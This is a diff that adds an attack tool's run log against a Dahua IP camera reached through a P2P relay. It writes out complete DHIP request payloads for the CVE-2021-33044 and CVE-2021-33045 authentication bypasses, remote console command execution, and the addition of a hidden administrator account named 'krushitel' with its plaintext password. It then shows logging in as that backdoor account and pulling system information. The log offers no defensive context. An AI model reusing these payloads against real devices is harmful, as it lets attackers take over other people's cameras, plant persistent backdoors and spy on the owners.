@@ -81,3 +81,88 @@ saving results at //danilaloh
 [22:12:13] 4J08667PAG96149 — snap failed: RTSP: read tcp 127.0.0.1:5047->127.0.0.1:5036: wsarecv: An established connection was aborted by the software in your host machine.
 1/1 | pwned: 0 | 01:13
 exploit finished
+[23:40] krushitel v1.4-beta (latest)
+started exploiting 1 SNs
+saving results at //danilaloh
+[23:40:30] xml import dir: danilaloh\xml
+[23:40:31] p2p-channel provisional 100 Trying — waiting for the final response
+[23:40:38] 4J08667PAG96149 — STUN failed! trying via relay
+[23:40:38] 4J08667PAG96149 — tunnel ok
+[23:40:38] [DHIP ->] method=global.login id=1 sess=0 payload={"id":1,"method":"global.login","params":{"authorityType":"Default","clientType":"NetKeyboard","loginType":"Direct","password":"Not Used","passwordType":"Default","userName":"admin"},"session":0}
+[23:40:38] [<- DHIP] method=global.login id=1 sess=0 resp={"id":1,"params":{"keepAliveInterval":60},"result":true,"session":23756947}
+
+[23:40:38] 4J08667PAG96149 — preflight: CVE-2021-33044
+[23:40:40] [DHIP ->] method=global.login id=1 sess=0 payload={"id":1,"method":"global.login","params":{"authorityType":"Default","clientType":"NetKeyboard","loginType":"Direct","password":"Not Used","passwordType":"Default","userName":"admin"},"session":0}
+[23:40:40] [<- DHIP] method=global.login id=1 sess=0 resp={"id":1,"params":{"keepAliveInterval":60},"result":true,"session":23651475}
+
+[23:40:40] [DHIP ->] method=console.factory.instance id=4 sess=23651475 payload={"id":4,"method":"console.factory.instance","params":null,"session":23651475}
+[23:40:40] [<- DHIP] method=console.factory.instance id=4 sess=23651475 resp={"id":4,"result":22815544,"session":23651475}
+
+[23:40:40] [DHIP ->] method=console.attach id=8 sess=23651475 payload={"id":8,"method":"console.attach","object":22815544,"params":{"proc":22815544},"session":23651475}
+[23:40:40] [<- DHIP] method=console.attach id=8 sess=23651475 resp={"id":8,"params":{"SID":262258},"result":true,"session":23651475}
+
+[23:40:40] [DHIP ->] method=console.runCmd id=6 sess=23651475 payload={"SID":262258,"id":6,"method":"console.runCmd","object":22815544,"params":{"command":"OnvifUser -u"},"session":23651475}
+[23:40:40] [<- DHIP] method=console.runCmd id=6 sess=23651475 resp={"id":6,"result":true,"session":23651475}
+
+[23:40:43] [DHIP ->] method=global.login id=1 sess=0 payload={"id":1,"method":"global.login","params":{"clientType":"Web3.0","loginType":"Direct","password":"","userName":"admin"},"session":0}
+[23:40:43] [<- DHIP] method=global.login id=1 sess=0 resp={"error":{"code":268632079,"message":"Component error: login challenge!"},"id":1,"params":{"authorization":"da7e9c2b30f4eaa325c2aca8863b83db4b089057","encryption":"Default","mac":"38AF29F24834","random":"1665754777","realm":"Login to 4J08667PAG96149"},"result":false,"session":24063636}
+
+[23:40:43] [DHIP ->] method=global.login id=1 sess=24063636 payload={"id":1,"method":"global.login","params":{"authorityType":"Default","clientType":"Console","ipAddr":"127.0.0.1","loginType":"Direct","password":"4251E25EF819D4BD519308A0FB591F28","passwordType":"Default","userName":"admin"},"session":24063636}
+[23:40:44] [<- DHIP] method=global.login id=1 sess=24063636 resp={"error":{"code":268632085,"message":"Component error: User or password not valid!"},"id":1,"params":{"remainLockSecond":300,"remainLoginTimes":4},"result":false,"session":24063636}
+
+[23:40:44] [DHIP ->] method=global.login id=1 sess=24063636 payload={"id":1,"method":"global.login","params":{"authorityType":"Default","clientType":"Local","ipAddr":"127.0.0.1","loginType":"Loopback","password":"147147147a","passwordType":"Plain","userName":"admin"},"session":24063636}
+[23:40:44] [DHIP ERR] method=global.login id=1 sess=24063636 read fail: EOF
+[23:40:44] 4J08667PAG96149 — креды не подошли, продолжаем
+[23:40:44] 4J08667PAG96149 — пробуем CVE-2021-33045 DHIP
+[23:40:44] [DHIP ->] method=global.login id=1 sess=0 payload={"id":1,"method":"global.login","params":{"authorityType":"Default","clientType":"Local","ipAddr":"127.0.0.1","loginType":"Loopback","password":"admin","passwordType":"Plain","userName":"admin"},"session":0}
+[23:40:44] [<- DHIP] method=global.login id=1 sess=0 resp={"id":1,"params":{"keepAliveInterval":60},"result":true,"session":23929235}
+
+[23:40:44] [DHIP ->] method=global.login id=1 sess=0 payload={"id":1,"method":"global.login","params":{"clientType":"Web3.0","loginType":"Direct","password":"","userName":"admin"},"session":0}
+[23:40:44] [<- DHIP] method=global.login id=1 sess=0 resp={"error":{"code":268632079,"message":"Component error: login challenge!"},"id":1,"params":{"authorization":"da7e9c2b30f4eaa325c2aca8863b83db4b089057","encryption":"Default","mac":"38AF29F24834","random":"1767298208","realm":"Login to 4J08667PAG96149"},"result":false,"session":23208595}
+
+[23:40:44] [DHIP ->] method=userManager.getAuthorityList id=4 sess=23929235 payload={"id":4,"method":"userManager.getAuthorityList","params":{},"session":23929235}
+[23:40:45] [<- DHIP] method=userManager.getAuthorityList id=4 sess=23929235 resp={"id":4,"params":["AuthUserMag","Monitor_01","Replay_01","AuthSysCfg","AuthSysInfo","AuthBackup","AuthStoreCfg","AuthEventCfg","AuthNetCfg","AuthPeripheral","AuthAVParam","AuthSecurity","AuthMaintence"],"result":true,"session":23929235}
+
+[23:40:45] [DHIP ->] method=userManager.addUser id=5 sess=23929235 payload={"id":5,"method":"userManager.addUser","params":{"user":{"AuthorityList":["AuthUserMag","Monitor_01","Replay_01","AuthSysCfg","AuthSysInfo","AuthBackup","AuthStoreCfg","AuthEventCfg","AuthNetCfg","AuthPeripheral","AuthAVParam","AuthSecurity","AuthMaintence"],"Encryption":"Default","Group":"admin","MacOnly":"","MaxMonitorChannels":0,"Memo":"krushitel","Name":"krushitel","Password":"228544B770C1590813633D366854D841","Reserved":false,"Sharable":true,"Type":"Normal"}},"session":23929235}
+[23:40:45] [<- DHIP] method=userManager.addUser id=5 sess=23929235 resp={"error":{"code":605,"message":""},"id":5,"result":false,"session":23929235}
+
+[23:40:45] [DHIP ->] method=userManager.addUser id=6 sess=23929235 payload={"id":6,"method":"userManager.addUser","params":{"user":{"AuthorityList":["AuthUserMag","Monitor_01","Replay_01","AuthSysCfg","AuthSysInfo","AuthBackup","AuthStoreCfg","AuthEventCfg","AuthNetCfg","AuthPeripheral","AuthAVParam","AuthSecurity","AuthMaintence"],"Encryption":"Plain","Group":"admin","MacOnly":"","MaxMonitorChannels":0,"Memo":"krushitel","Name":"krushitel","Password":"TancuiPantera1337","Reserved":false,"Sharable":true,"Type":"Normal"}},"session":23929235}
+[23:40:45] [<- DHIP] method=userManager.addUser id=6 sess=23929235 resp={"error":{"code":605,"message":""},"id":6,"result":false,"session":23929235}
+
+[23:40:48] [DHIP ->] method=global.login id=1 sess=0 payload={"id":1,"method":"global.login","params":{"clientType":"Web3.0","loginType":"Direct","password":"","userName":"admin"},"session":0}
+[23:40:48] [<- DHIP] method=global.login id=1 sess=0 resp={"error":{"code":268632079,"message":"Component error: login challenge!"},"id":1,"params":{"authorization":"da7e9c2b30f4eaa325c2aca8863b83db4b089057","encryption":"Default","mac":"38AF29F24834","random":"1444985457","realm":"Login to 4J08667PAG96149"},"result":false,"session":23328403}
+
+[23:40:48] [DHIP ->] method=global.login id=1 sess=23328403 payload={"id":1,"method":"global.login","params":{"authorityType":"Default","clientType":"Console","ipAddr":"127.0.0.1","loginType":"Direct","password":"A1CD951D31AA8CD1B8C0408A7FF409ED","passwordType":"Default","userName":"krushitel"},"session":23328403}
+[23:40:48] [<- DHIP] method=global.login id=1 sess=23328403 resp={"id":1,"params":{"keepAliveInterval":60},"result":true,"session":23328403}
+
+[23:40:50] [DHIP ->] method=global.login id=1 sess=0 payload={"id":1,"method":"global.login","params":{"clientType":"Web3.0","loginType":"Direct","password":"","userName":"admin"},"session":0}
+[23:40:51] [<- DHIP] method=global.login id=1 sess=0 resp={"error":{"code":268632079,"message":"Component error: login challenge!"},"id":1,"params":{"authorization":"da7e9c2b30f4eaa325c2aca8863b83db4b089057","encryption":"Default","mac":"38AF29F24834","random":"407067551","realm":"Login to 4J08667PAG96149"},"result":false,"session":57131155}
+
+[23:40:51] [DHIP ->] method=global.login id=1 sess=57131155 payload={"id":1,"method":"global.login","params":{"authorityType":"Default","clientType":"Console","ipAddr":"127.0.0.1","loginType":"Direct","password":"67B4CA7AB2A0374E14AABC07E00BC42B","passwordType":"Default","userName":"krushitel"},"session":57131155}
+[23:40:51] [<- DHIP] method=global.login id=1 sess=57131155 resp={"id":1,"params":{"keepAliveInterval":60},"result":true,"session":57131155}
+
+[23:40:52] [DHIP ->] method=global.login id=1 sess=0 payload={"id":1,"method":"global.login","params":{"authorityType":"Default","clientType":"NetKeyboard","loginType":"Direct","password":"Not Used","passwordType":"Default","userName":"admin"},"session":0}
+[23:40:53] [<- DHIP] method=global.login id=1 sess=0 resp={"id":1,"params":{"keepAliveInterval":60},"result":true,"session":23663508}
+
+[23:40:53] [DHIP ->] method=magicBox.getDeviceType id=5 sess=23663508 payload={"id":5,"method":"magicBox.getDeviceType","params":null,"session":23663508}
+[23:40:53] [<- DHIP] method=magicBox.getDeviceType id=5 sess=23663508 resp={"id":5,"params":{"type":"IPC-HFW1230S"},"result":true,"session":23663508}
+
+[23:40:53] 4J08667PAG96149 — dummy добавлен (CVE-2021-33045-DHIP) krushitel:TancuiPantera1337
+[23:40:53] [DHIP ->] method=global.login id=1 sess=0 payload={"id":1,"method":"global.login","params":{"clientType":"Web3.0","loginType":"Direct","password":"","userName":"admin"},"session":0}
+[23:40:54] [<- DHIP] method=global.login id=1 sess=0 resp={"error":{"code":268632079,"message":"Component error: login challenge!"},"id":1,"params":{"authorization":"da7e9c2b30f4eaa325c2aca8863b83db4b089057","encryption":"Default","mac":"38AF29F24834","random":"2113955226","realm":"Login to 4J08667PAG96149"},"result":false,"session":23573652}
+
+[23:40:54] [DHIP ->] method=global.login id=1 sess=23573652 payload={"id":1,"method":"global.login","params":{"authorityType":"Default","clientType":"Console","ipAddr":"127.0.0.1","loginType":"Direct","password":"F23F8F5D7C19F30699955F948BA9F81D","passwordType":"Default","userName":"krushitel"},"session":23573652}
+[23:40:54] [<- DHIP] method=global.login id=1 sess=23573652 resp={"id":1,"params":{"keepAliveInterval":60},"result":true,"session":23573652}
+
+[23:40:54] [DHIP ->] method=configManager.getConfig id=20 sess=23573652 payload={"id":20,"method":"configManager.getConfig","params":{"name":"ChannelTitle"},"session":23573652}
+[23:40:55] [<- DHIP] method=configManager.getConfig id=20 sess=23573652 resp={"id":20,"params":{"table":[{"Name":"IPC"}]},"result":true,"session":23573652}
+
+[23:40:55] [DHIP ->] method=magicBox.getSystemInfo id=21 sess=23573652 payload={"id":21,"method":"magicBox.getSystemInfo","params":null,"session":23573652}
+[23:40:55] [<- DHIP] method=magicBox.getSystemInfo id=21 sess=23573652 resp={"id":21,"params":{"appAutoStart":true,"deviceType":"IPC-HFW1230S","hardwareVersion":"1.00","processor":"HI3516CV300","serialNumber":"4J08667PAG96149","updateSerial":"IPC-HDBW1230E-S2","updateSerialCloudUpgrade":"IPC-HDBW1230E-S2:01:02:05:60:28:00:01:00:00:00:00:320:00:00:00:00:00:00:00:00:100"},"result":true,"session":23573652}
+
+[23:41:38] 4J08667PAG96149 — snap failed: RTSP: read tcp 127.0.0.1:53632->127.0.0.1:53591: wsarecv: An existing connection was forcibly closed by the remote host.
+[23:41:38] 4J08667PAG96149 — titles (channel): connect: tunnel closed
+[23:41:43] 4J08667PAG96149 — titles (OSD): connect: tunnel is down
+[23:41:43] 4J08667PAG96149 — STUN failed! trying via relay
+1/1 | pwned: 0 · added: 1 | 01:12
+exploit finished
